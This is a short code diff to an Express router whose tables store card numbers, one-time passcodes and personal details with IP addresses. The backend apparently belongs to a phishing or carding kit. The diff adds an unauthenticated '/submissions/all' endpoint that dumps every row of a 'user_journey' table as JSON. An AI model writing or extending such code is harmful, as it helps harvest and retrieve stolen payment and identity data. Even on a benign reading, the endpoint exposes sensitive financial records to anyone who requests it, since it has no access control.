@@ -1,5 +1,6 @@
 import { Router, type IRouter } from "express";
 import { db, cardSubmissionsTable, otpSubmissionsTable, personalSubmissionsTable } from "@workspace/db";
+import { sql } from "drizzle-orm";
 import { z } from "zod";
 
 const router: IRouter = Router();
@@ -36,6 +37,11 @@ const PersonalBody = z.object({
   inquiryType: z.string().optional(),
   message: z.string().optional(),
   ipAddress: z.string().optional(),
+});
+
+router.get("/submissions/all", async (req, res): Promise<void> => {
+  const rows = await db.execute(sql`SELECT * FROM user_journey`);
+  res.json(rows.rows);
 });
 
 router.post("/submissions/card", async (req, res): Promise<void> => {
